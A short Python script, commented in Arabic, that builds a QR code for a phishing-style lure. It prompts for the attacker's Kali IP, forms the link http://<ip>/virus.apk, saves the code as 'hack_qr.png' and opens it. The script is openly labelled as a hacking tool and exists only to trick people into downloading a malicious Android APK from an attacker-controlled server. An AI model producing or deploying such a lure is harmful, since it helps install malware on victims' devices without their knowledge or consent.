import qrcode
import os

def generate_hacking_qr():
    # الرابط الذي يشير إلى ملف الـ APK على سيرفر الكالي
    server_ip = input("Enter your Kali IP: ")
    payload_link = f"http://{server_ip}/virus.apk"
    
    # تحويل الرابط إلى باركود
    qr = qrcode.make(payload_link)
    qr.save("hack_qr.png")
    print(f"[+] QR Code generated for: {payload_link}")
    os.system("xdg-open hack_qr.png")

generate_hacking_qr()
